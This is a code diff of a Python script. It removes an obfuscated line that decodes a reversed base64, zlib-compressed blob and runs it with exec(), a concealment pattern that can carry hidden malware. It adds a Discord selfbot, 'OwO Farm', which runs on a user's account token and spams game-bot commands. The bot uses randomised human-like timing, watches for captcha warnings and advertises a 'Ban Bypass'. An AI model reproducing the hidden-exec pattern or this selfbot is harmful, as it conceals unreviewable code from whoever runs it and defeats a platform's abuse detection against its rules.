@@ -1,4 +1,245 @@
+import os as brutality_adib
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+brutality_adib.system("pip install discord.py==1.7.3")
+brutality_adib.system("pip install colorama")
+brutality_adib.system(
+    "sleep 2 && clear >/dev/null 2>&1 &"
+    if brutality_adib.name == "posix"
+    else "timeout /t 2 >nul 2>&1 && cls"
+)
+import json as ghostop
+import random as adibbro
+from colorama import Fore, Style, init
+import discord
+from discord.ext import commands, tasks
+import time
+import sys
+import re
+import asyncio as made_by_adib
+import aiohttp
+from datetime import datetime, timedelta
+
+
+adibop = discord.Intents.all()
+adibyy = "."
+adib = commands.Bot(
+    command_prefix=adibyy, case_insensitive=True, self_bot=True, intents=adibop
+)
+adib.remove_command("help")
+
+adib_start_time = datetime.now()
+adib_commands_sent = 0
+adib_gems_used = 0
+running = True
+pray_loop_running = True
+last_gem_check = 0
+
+print(
+    f"""{Fore.BLUE}
+
+░█████╗░░██╗░░░░░░░██╗░█████╗░  ██╗░░░██╗░░███╗░░░░░░█████╗░
+██╔══██╗░██║░░██╗░░██║██╔══██╗  ██║░░░██║░████║░░░░░██╔══██╗
+██║░░██║░╚██╗████╗██╔╝██║░░██║  ╚██╗░██╔╝██╔██║░░░░░██║░░██║
+██║░░██║░░████╔═████║░██║░░██║  ░╚████╔╝░╚═╝██║░░░░░██║░░██║
+╚█████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝  ░░╚██╔╝░░███████╗██╗╚█████╔╝
+░╚════╝░░░░╚═╝░░░╚═╝░░░╚════╝░  ░░░╚═╝░░░╚══════╝╚═╝░╚════╝░
+                                                        BETA{Style.RESET_ALL}"""
+)
+
+init(autoreset=True)
+print(f"{Fore.LIGHTRED_EX}\n\n > Made By Adib{Style.RESET_ALL}")
+
+@adib.event
+async def on_ready():
+    print(
+        f"{Fore.LIGHTRED_EX} > OwO Farm v1.0 Connected To:{Style.RESET_ALL}",
+        f"{Fore.LIGHTGREEN_EX}{adib.user}{Style.BRIGHT}{Style.RESET_ALL}",
+    )
+    print(f"{Fore.LIGHTRED_EX} >{Style.RESET_ALL}")
+
+
+
+
+@adib.command(aliases=["h"])
+async def help(ctx):
+    adib_help = """
+    # 🤑 Adib OwO Farm V1.0 🤑
+Prefix: `.`
+
+**__Main__**
+ 🌟 Start: *Starts The AutoBot*
+ 🛑 Stop: *Stops The AutoBot*
+ 🔍 Status: *Shows Bot Status*
+
+**__Features__**
+ ⚠ Ban Bypass
+ 🚨 Auto Detects OwO Warnings
+ ⏱ Auto Cut After 1 Warning
+ 💎 Auto Use Gems
+ 🏹 Fast And Secure
+
+**__Made with 💖 and 🧠 by adib__**
+"""
+    await ctx.send(adib_help)
+
+
+
+
+
+async def parse_gems(inventory_message):
+    rarity_order = ['f', 'l', 'm', 'e', 'r', 'u', 'c']
+    gems_by_tier = {
+        '1': [],
+        '2': [],
+        '3': [],
+        '4': []
+    }
+    lines = inventory_message.split('\n')
+    for line in lines:
+        for tier in ['1', '2', '3', '4']:
+            for rarity in rarity_order:
+                pattern = fr'`(\d+)`<:({rarity}gem{tier}):\d+>'
+                match = re.search(pattern, line)
+                if match:
+                    gem_number = match.group(1)
+                    gems_by_tier[tier].append((rarity, gem_number))
+    for tier in gems_by_tier:
+        gems_by_tier[tier].sort(key=lambda x: rarity_order.index(x[0]))
+    selected_gems = []
+    for tier in ['1', '2', '3', '4']:
+        if gems_by_tier[tier]:
+            selected_gems.append(gems_by_tier[tier][0][1])
+
+    return selected_gems
+
+async def do_gem_check(ctx):
+    global adib_gems_used
+    await ctx.send("owo inventory")
+    await made_by_adib.sleep(3)
+
+    try:
+        latest_messages = await ctx.channel.history(limit=2).flatten()
+
+        for message in latest_messages:
+            if message.author.id == 408785106942164992:
+                if "inventory" in message.content.lower():
+                    gem_numbers = await parse_gems(message.content)
+                    if gem_numbers:
+                        use_command = "owo use " + " ".join(gem_numbers)
+                        await ctx.send(use_command)
+                        adib_gems_used += len(gem_numbers)
+                        await made_by_adib.sleep(3)
+                    else:
+                        print("No gems found")
+                    break
+    except Exception as e:
+        print(f"Error in gem check: {e}")
+        import traceback
+        print(traceback.format_exc())
+
+
+async def check_warning(ctx):
+    global running
+    try:
+        messages = await ctx.channel.history(limit=10).flatten()
+
+        for msg in messages:
+            msg_content = str(msg.content).lower()
+
+            checkph = [
+                "captcha",
+                "Please complete thi​s wit​hin 1​0 m​inutes o​r i​t m​ay r​esult i​n a​ ba​n!",
+                "P​lease comple​te you​r c​aptcha t​o ver​ify th​at y​ou ar​e huma​n!",
+                "a​re y​ou a​ rea​l hu​man?"
+            ]
+            if any(phrase.lower() in msg_content for phrase in checkph):
+                global running
+                running = False
+
+                await ctx.send("⚠ Warning Detected! 🛑 Stopping The Process | Type .start again to re-start grinding")
+                print("⚠ Warning Detected! 🛑 Stopping The Process | Type .start again to re-start grinding")
+                return True
+        return False
+    except Exception as e:
+        print(f"Warning check error: {e}")
+        return False
+
+@adib.command()
+async def start(ctx):
+    global running, last_gem_check, adib_commands_sent
+    running = True
+    last_gem_check = time.time()
+    last_command = None
+
+    while running:
+        try:
+            current_time = time.time()
+            adibgemrandomcheck = adibbro.choice([244, 293, 366, 415])
+            if current_time - last_gem_check >= adibgemrandomcheck:
+                warning_detected = await check_warning(ctx)
+                if warning_detected or not running:
+                    break
+                await do_gem_check(ctx)
+                last_gem_check = current_time
+                continue
+
+            commands = [
+                "owoh", "owo pray", "owo h", "owo b", "owob", "owoh", "owo h", "owo sc all",
+                adibbro.choice(["owo cf 1", "owoz", "owo s 1", "owo owo", "owoq","owo lb all"]),
+                adibbro.choice(["owo pup", "owo army", "owo piku", "owo run"]),
+                adibbro.choice(["owo punch <@408785106942164992>", "owo roll"])
+            ]
+            command = adibbro.choice(commands)
+
+            while command == last_command:
+                command = adibbro.choice(commands)
+            last_command = command
+
+            await ctx.send(command)
+            adib_commands_sent += 1
+
+            await made_by_adib.sleep(0.3)
+            warning_detected = await check_warning(ctx)
+            if warning_detected or not running:
+                break
+
+            await made_by_adib.sleep(adibbro.uniform(6, 22.0))
+            if adibbro.random() < 0.05:
+                await made_by_adib.sleep(adibbro.uniform(300, 600))
+
+        except Exception as e:
+            print(f"Error in main loop: {e}")
+
+
+
+@adib.command()
+async def stop(ctx):
+    global running
+    await ctx.send(
+        "🛑 Stopping | Type .start again to re-start grinding"
+    )
+    running = False
+
+@adib.command()
+async def status(ctx):
+    adib_state = "🟢 Running" if running else "🔴 Stopped"
+    adib_uptime = datetime.now() - adib_start_time
+    hrs, rem = divmod(int(adib_uptime.total_seconds()), 3600)
+    mins, secs = divmod(rem, 60)
+
+    gstatusadib = f"""
+🔍 **Bot Status:** {adib_state}
+
+> 🕒 **Running Since:** {adib_start_time.strftime('%d-%b-%Y %I:%M:%S %p')}
+> 📈 **Uptime:** {hrs}h {mins}m {secs}s
+> 📊 **Commands Sent:** {adib_commands_sent}
+> 💎 **Gems Used:** {adib_gems_used}
+> ♻️ **Last Gem Check:** {'<t:' + str(int(last_gem_check)) + ':R>' if last_gem_check else 'Never'}
+"""
+    await ctx.send(gstatusadib)
+
+with open("config.json", "r") as config_file:
+    config = ghostop.load(config_file)
+
+adibopaf = config["TOKEN"]
+adib.run(adibopaf, bot=False)
